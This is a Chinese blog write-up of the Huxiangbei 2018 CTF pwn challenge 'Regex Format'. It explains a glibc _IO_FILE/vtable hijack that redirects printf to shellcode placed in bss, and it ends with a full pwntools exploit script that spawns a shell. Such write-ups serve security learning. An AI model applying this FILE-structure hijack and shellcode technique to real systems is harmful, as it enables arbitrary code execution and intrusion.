---
title: 湖湘杯2018-Regex Format
date: 2018-11-20 16:27:22
tags: 题目
---
<h1><strong>0x00 前言</strong></h1>
hxb2018题目 pwn1-Regex  Format赛时没有做出来 听师傅们说用IO_FILE文件劫持流 赛后学习了学习
只能说学到姿势比赛都没用到 一比赛就有新姿势..
<h1><strong>0x01 IO_FILE_stdout</strong></h1>

这点我不用多详细介绍.. CTF-WIKI中有详细的介绍https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction/
我们主要讲一下这个如何使用这个漏洞方法 FILE文件结构是
```c++
struct _IO_FILE_plus
{
    _IO_FILE    file;
    IO_jump_t   *vtable;
}
```
其中包含着_IO_FILE结构和IO_jump_t结构 重点就是一些函数进行IO操作时候会去访问vtable里面的函数指针 那我们如果修改vtable函数
指针的话就可以达到任意地址读写 下面就上本博客的重点hxb2018-Regex Format
<h1><strong>0x02 Regex Format</strong></h1>

拿到文件先checksec一下
```
[*] '/home/rep/R3p_1s_G0d/hxb2018/pwn1'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
无保护 什么操作都可以.. 文件拖入IDA静态调试一番 其实整个程序很长的 后面还有一个bss段data段匹配的过程 因为这个文件什么保护都没有 赛后有大佬用的栈溢出也是可以的
![](https://i.loli.net/2018/11/20/5bf3c9850d9d9.png)
``aBeforeUseItUnd``是data段 他先取了这个这个字段的长度从aBeforeUseItUnd偏移这个长度开始开始写入第一个(这个长度gdb动态调试一下就出来了)
下面重点来了
![](https://i.loli.net/2018/11/20/5bf3ccbe25407.png)
下面这串字串写在了unk_804A634段 取查看了下 unk_804A634在bss段中 并且bss段可写 那就可以把shellcode写到bss段 再去用vtable指针指向我们的shellcode就可以了 
下面需要做的就是先去伪造一个_IO_FILE结构体并且使它的地址指向我们伪造的vtable 是vtable的printf指针指向我们的shellcode处(因为再匹配后调用了printf 所有可以修改vtable中的printf指针)
先看一一下_IO_FILE结构体
```python
$1 = {
  file = {
    _flags = 0xfbad2084, 
    _IO_read_ptr = 0x0, 
    _IO_read_end = 0x0, 
    _IO_read_base = 0x0, 
    _IO_write_base = 0x0, 
    _IO_write_ptr = 0x0, 
    _IO_write_end = 0x0, 
    _IO_buf_base = 0x0, 
    _IO_buf_end = 0x0, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0xf7fb75a0 <_IO_2_1_stdin_>, 
    _fileno = 0x1, 
    _flags2 = 0x0, 
    _old_offset = 0xffffffff, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = "", 
    _lock = 0xf7fb8870 <_IO_stdfile_1_lock>, 
    _offset = 0xffffffffffffffff, 
    _codecvt = 0x0, 
    _wide_data = 0xf7fb74e0 <_IO_wide_data_1>, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0x0, 
    _unused2 = '\000' <repeats 39 times>
  }, 
  vtable = 0xf7fb6ac0 <_IO_file_jumps>
}
```
结构差不多是这个样子 接下来看看在内存中的存储
```
0xf7fb7d60 <_IO_2_1_stdout_>:	0x00000000fbad2084	0x0000000000000000
0xf7fb7d70 <_IO_2_1_stdout_+16>:	0x0000000000000000	0x0000000000000000
0xf7fb7d80 <_IO_2_1_stdout_+32>:	0x0000000000000000	0x0000000000000000
0xf7fb7d90 <_IO_2_1_stdout_+48>:	0xf7fb75a000000000	0x0000000000000001
0xf7fb7da0 <_IO_2_1_stdout_+64>:	0x00000000ffffffff	0xfffffffff7fb8870
0xf7fb7db0 <_IO_2_1_stdout_+80>:	0x00000000ffffffff	0x00000000f7fb74e0
0xf7fb7dc0 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x0000000000000000
0xf7fb7dd0 <_IO_2_1_stdout_+112>:	0x0000000000000000	0x0000000000000000
0xf7fb7de0 <_IO_2_1_stdout_+128>:	0x0000000000000000	0x0000000000000000
0xf7fb7df0 <_IO_2_1_stdout_+144>:	0xf7fb6ac000000000	0xf7fb7d60f7fb7cc0
```
我们只要保证flag位和vtable正确就可以 flag位要通过libc的检验详情看https://www.jianshu.com/p/f14adeda85df
flag要满足``flag&8 = 0 and flag &2 =0 and flag & 0x8000 != 0``所以我们flag可以取``0xfbad8080，0xfbad8000``等..
可以看到flag位和0xf7b6ac0(vtable指针)中间差了36个四字节 那就是IO_FILE结构体中其他变量 我们在这里都不需要管
所有我们就可以伪造处fake_IO_stdout = flag大小+'0000'*36+fake_vtable
伪造完IO_FIlE后 我们需要去伪造vtable让我们去写入我们的shellcode 我们在bss段找一个合适大小的地方 因为前面的fake_IO_stdout已经快写了0x100字节
我们就补全他们 从unk_804A634+0x100开始当我们的vtable处 vtable结构体的样子
```python
void * funcs[] = {
   1 NULL, // "extra word"
   2 NULL, // DUMMY
   3 exit, // finish
   4 NULL, // overflow
   5 NULL, // underflow
   6 NULL, // uflow
   7 NULL, // pbackfail
   
   8 NULL, // xsputn  #printf
   9 NULL, // xsgetn
   10 NULL, // seekoff
   11 NULL, // seekpos
   12 NULL, // setbuf
   13 NULL, // sync
   14 NULL, // doallocate
   15 NULL, // read
   16 NULL, // write
   17 NULL, // seek
   18 pwn,  // close
   19 NULL, // stat
   20 NULL, // showmanyc
   21 NULL, // imbue
};
```
可以很清楚的看到第8个位置是我们的printf函数需要去访问的地方 前28字节覆盖到第8个位置时候我们赋值为当前地址之后意思就是当printf访问该地方时候会去访问偏移4字节之后的地方 
这样我们刚好在后面布置我们的shellcode 所有是fake_table = 'a'*28+当前地址+4+shellcode(shellcode起始位置就是前面变量起始处+4)
最后一步就是 使stdout流引到我们fake的stdout上 gdb调试一下了解到需要覆盖0x49字节
<h1><strong>0x03 exp</strong></h1>

```python
#!/usr/bin/python
from pwn import *
#first index
context.binary = "./pwn1"
#context.log_level="debug"
sh = process('./pwn1')
#sh = remote('ip',端口)

fake_IO_stdout = 0x804A24C
fake_vtable = 0x804A24C + 0x100
sh.recvuntil('format\n')
sh.sendline('a')


#two index -> fake IO_stdout
payload = p32(0xfbad8000)+p32(0)*36+p32(fake_vtable)
payload = payload.ljust(0x100,'\x00')

#three index ->fake IO_vtable
shell = payload + 'a'*28 + p32(fake_IO_stdout+0x120)+asm(shellcraft.sh())
sh.recvuntil('match\n')
sh.sendline(shell)

#gdb.attach(sh)
#four index -> mondify stdout
shell = 'a'*0x49 + p32(fake_IO_stdout)
sh.recvuntil('[Y/n]\n')
sh.sendline('Y')
sh.recvuntil('format\n')
sh.sendline(shell)
sh.interactive()
```